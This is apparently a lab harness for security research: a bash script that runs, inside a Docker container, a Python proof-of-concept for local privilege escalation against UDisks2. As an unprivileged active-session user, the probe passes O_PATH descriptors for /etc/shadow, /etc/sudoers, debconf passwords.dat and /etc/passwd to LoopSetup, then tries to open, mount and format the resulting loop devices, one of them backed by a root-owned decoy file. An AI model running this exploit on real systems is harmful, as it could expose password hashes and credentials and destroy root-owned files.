#!/usr/bin/env bash
set -euo pipefail

container="${1:-ubuntu24-server-lpe-target}"
workspace="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
log="$workspace/logs/active-udisks-opath-fd.out"
mkdir -p "$workspace/logs"

docker exec -i "$container" bash -s <<'EOS' >"$log" 2>&1
set -euo pipefail

tmp=/tmp/active-udisks-opath-fd
home=/home/selfauth/active-udisks-opath-fd
console=10
root_marker=/root/active_udisks_opath_fd_root
safe_victim=/root/active_udisks_opath_fd_victim

cleanup() {
  set +e
  loginctl terminate-user selfauth >/dev/null 2>&1 || true
  rm -f /home/selfauth/.bash_profile
  systemctl start "getty@tty${console}.service" >/dev/null 2>&1 || true
  while read -r dev; do
    [ -n "$dev" ] && udisksctl loop-delete -b "$dev" --no-user-interaction >/dev/null 2>&1 || losetup -d "$dev" >/dev/null 2>&1 || true
  done <"$tmp/loops" 2>/dev/null || true
  rm -rf "$tmp" "$home" "$root_marker" "$safe_victim"
  if ! systemctl is-active --quiet udisks2.service; then
    systemctl restart udisks2.service >/dev/null 2>&1 || true
  fi
  systemctl reset-failed getty@tty${console}.service >/dev/null 2>&1 || true
  systemctl reset-failed udisks2.service >/dev/null 2>&1 || true
}

rm -rf "$tmp" "$home" "$root_marker" "$safe_victim"
mkdir -p "$tmp" "$home"
: >"$tmp/loops"
: >"$tmp/user.out"
chown -R selfauth:selfauth "$tmp" 2>/dev/null || true
chmod 0755 "$tmp"
id selfauth >/dev/null 2>&1 || useradd -m -s /bin/bash selfauth
echo selfauth:selfauth | chpasswd
usermod -G selfauth selfauth
chown -R selfauth:selfauth "$home"
trap cleanup EXIT

printf 'root-owned safe victim before\n' >"$safe_victim"
chmod 0600 "$safe_victim"

cat >"$home/probe.py" <<'PY'
#!/usr/bin/env python3
import os
import stat
import sys
import time

import dbus

BUS = "org.freedesktop.UDisks2"
MANAGER = "/org/freedesktop/UDisks2/Manager"
ROOT = "/org/freedesktop/UDisks2"
WORK = "/tmp/active-udisks-opath-fd"
LOOPS = os.path.join(WORK, "loops")

def vdict(d=None):
    out = dbus.Dictionary({}, signature="sv")
    for k, v in (d or {}).items():
        out[k] = v
    return out

def log(msg=""):
    print(msg, flush=True)

def props(bus, path, iface):
    return dbus.Interface(bus.get_object(BUS, path), "org.freedesktop.DBus.Properties").GetAll(iface)

def loop_delete(path):
    try:
        loop = dbus.Interface(bus.get_object(BUS, path), "org.freedesktop.UDisks2.Loop")
        block = props(bus, path, "org.freedesktop.UDisks2.Block")
        dev = bytes(block.get("Device", b"")).split(b"\0", 1)[0].decode("utf-8", "replace")
        if dev:
            with open(LOOPS, "a", encoding="utf-8") as f:
                f.write(dev + "\n")
        loop.Delete(vdict())
        log(f"  loop_delete ok dev={dev}")
    except Exception as exc:
        log(f"  loop_delete error {type(exc).__name__}: {exc}")

def try_loop(label, path, flags, readonly):
    flag_names = []
    if flags & getattr(os, "O_PATH", 0):
        flag_names.append("O_PATH")
    if flags & os.O_RDONLY == os.O_RDONLY and not flag_names:
        flag_names.append("O_RDONLY")
    log(f"== {label}: path={path} flags={'+'.join(flag_names) or flags} readonly={readonly} ==")
    try:
        st = os.lstat(path)
        log(f"  lstat mode={stat.filemode(st.st_mode)} uid={st.st_uid} gid={st.st_gid} size={st.st_size} rdev={getattr(st, 'st_rdev', 0)}")
    except Exception as exc:
        log(f"  lstat error {exc}")
    try:
        fd = os.open(path, flags | os.O_CLOEXEC)
        fst = os.fstat(fd)
        log(f"  open ok fd={fd} fstat mode={stat.filemode(fst.st_mode)} uid={fst.st_uid} gid={fst.st_gid} size={fst.st_size}")
    except Exception as exc:
        log(f"  open error {type(exc).__name__}: {exc}")
        return None
    try:
        opts = vdict({"read-only": dbus.Boolean(readonly, variant_level=1)})
        res = manager.LoopSetup(dbus.types.UnixFd(fd), opts)
        log(f"  LoopSetup OK {res}")
        block = props(bus, str(res), "org.freedesktop.UDisks2.Block")
        loop = props(bus, str(res), "org.freedesktop.UDisks2.Loop")
        dev = bytes(block.get("Device", b"")).split(b"\0", 1)[0].decode("utf-8", "replace")
        log(f"  loop_device={dev}")
        log(f"  block_id_usage={block.get('IdUsage')} id_type={block.get('IdType')} size={block.get('Size')}")
        log(f"  loop_setup_by_uid={loop.get('SetupByUID')} backing={loop.get('BackingFile')} autoclear={loop.get('Autoclear')}")
        if dev:
            with open(LOOPS, "a", encoding="utf-8") as f:
                f.write(dev + "\n")
        return str(res)
    except Exception as exc:
        log(f"  LoopSetup error {type(exc).__name__}: {exc}")
        return None
    finally:
        try:
            os.close(fd)
        except OSError:
            pass

def try_block_methods(loop_path, destructive=False):
    block = dbus.Interface(bus.get_object(BUS, loop_path), "org.freedesktop.UDisks2.Block")
    fs = dbus.Interface(bus.get_object(BUS, loop_path), "org.freedesktop.UDisks2.Filesystem")
    for mode in ("r", "w", "rw"):
        try:
            got = block.OpenDevice(mode, vdict())
            fd = got.take()
            log(f"  OpenDevice({mode}) OK fd={fd}")
            os.close(fd)
        except Exception as exc:
            log(f"  OpenDevice({mode}) error {type(exc).__name__}: {exc}")
    try:
        mount = fs.Mount(vdict({"options": dbus.String("ro", variant_level=1)}))
        log(f"  Mount(ro) OK {mount}")
    except Exception as exc:
        log(f"  Mount(ro) error {type(exc).__name__}: {exc}")
    if destructive:
        try:
            block.Format("vfat", vdict({"label": dbus.String("OPATHFD", variant_level=1)}))
            log("  Format(vfat label OPATHFD) OK")
        except Exception as exc:
            log(f"  Format(vfat) error {type(exc).__name__}: {exc}")

bus = dbus.SystemBus()
manager = dbus.Interface(bus.get_object(BUS, MANAGER), "org.freedesktop.UDisks2.Manager")

log("## active session proof")
log(f"uid={os.getuid()} gid={os.getgid()} groups={os.getgroups()}")
log(f"tty={os.ttyname(0) if os.isatty(0) else 'not-tty'}")
sid = os.environ.get("XDG_SESSION_ID", "")
log(f"XDG_SESSION_ID={sid}")
os.system(f"loginctl show-session {sid} -p Id -p User -p Name -p Seat -p TTY -p Active -p State -p Type -p Class -p Remote 2>&1")

O_PATH = getattr(os, "O_PATH", 0)
targets = [
    ("shadow-opath", "/etc/shadow", O_PATH, True),
    ("sudoers-opath", "/etc/sudoers", O_PATH, True),
    ("debconf-passwords-opath", "/var/cache/debconf/passwords.dat", O_PATH, True),
    ("passwd-opath-rw-request", "/etc/passwd", O_PATH, False),
    ("passwd-ordinary-rw-request", "/etc/passwd", os.O_RDONLY, False),
    ("root-safe-victim-opath-rw-request", "/root/active_udisks_opath_fd_victim", O_PATH, False),
]

made = []
for label, path, flags, readonly in targets:
    lp = try_loop(label, path, flags, readonly)
    if lp:
        made.append((label, lp))
        try_block_methods(lp, destructive=(label == "root-safe-victim-opath-rw-request"))

log("## loop cleanup")
for _label, lp in made:
    loop_delete(lp)

log("## marker checks")
for p in ("/root/active_udisks_opath_fd_root", "/root/active_udisks_opath_fd_victim"):
    try:
        st = os.stat(p)
        log(f"  {p}: mode={stat.filemode(st.st_mode)} uid={st.st_uid} gid={st.st_gid} size={st.st_size}")
    except Exception as exc:
        log(f"  {p}: absent-or-inaccessible {type(exc).__name__}: {exc}")
PY
chmod 0755 "$home/probe.py"
chown -R selfauth:selfauth "$home"

cat >"/home/selfauth/.bash_profile" <<'SH'
python3 /home/selfauth/active-udisks-opath-fd/probe.py >/tmp/active-udisks-opath-fd/user.out 2>&1
exit
SH
chown selfauth:selfauth /home/selfauth/.bash_profile

{
  echo "## target/default proof"
  cat /etc/os-release | sed -n '1,8p'
  uname -a
  id attacker
  id selfauth
  dpkg-query -W -f='${binary:Package}\t${Version}\t${db:Status-Abbrev}\n' \
    udisks2 libudisks2-0 dbus polkitd systemd python3-dbus python3-gi 2>&1 | sort
  systemctl status udisks2.service --no-pager -l | sed -n '1,80p'
  echo
  echo "## UDisks LoopSetup and policy"
  gdbus introspect --system --dest org.freedesktop.UDisks2 --object-path /org/freedesktop/UDisks2/Manager | sed -n '/LoopSetup/,+8p'
  awk '/org.freedesktop.udisks2.loop-setup/{flag=1} flag{print} /<\/action>/{if(flag) exit}' /usr/share/polkit-1/actions/org.freedesktop.UDisks2.policy
  echo
  echo "## root-owned target file modes"
  for p in /etc/shadow /etc/sudoers /var/cache/debconf/passwords.dat /etc/passwd "$safe_victim"; do
    stat -Lc '%A %a %U:%G %F %s %n' "$p" 2>&1 || true
  done
  echo
} 

loginctl terminate-user selfauth >/dev/null 2>&1 || true
systemctl stop "getty@tty${console}.service" >/dev/null 2>&1 || true
timeout 160 openvt -c "$console" -s -f -w -- /bin/login -f selfauth || true
systemctl start "getty@tty${console}.service" >/dev/null 2>&1 || true
loginctl terminate-user selfauth >/dev/null 2>&1 || true
rm -f /home/selfauth/.bash_profile

echo
echo "## active selfauth fd-passing results"
cat "$tmp/user.out" 2>&1 || true

echo
echo "## root-side post checks"
if [ -e "$safe_victim" ]; then
  stat -Lc '%A %a %U:%G %F %s %n' "$safe_victim"
  od -An -tx1 -N64 "$safe_victim" | sed 's/^/safe_victim_hex: /'
fi
if [ -e "$root_marker" ]; then
  echo "ROOT_PROOF_PRESENT $root_marker"
  ls -l "$root_marker"
  cat "$root_marker"
else
  echo "ROOT_PROOF_ABSENT $root_marker"
fi
echo
echo "## health before cleanup"
systemctl is-system-running || true
systemctl --failed --no-legend || true

cleanup
trap - EXIT

echo
echo "## cleanup verification"
test ! -e "$root_marker" && echo root_marker_absent
test ! -e "$safe_victim" && echo safe_victim_absent
systemctl is-active udisks2.service || true
systemctl is-system-running || true
systemctl --failed --no-legend || true
EOS

sed -n '1,360p' "$log"
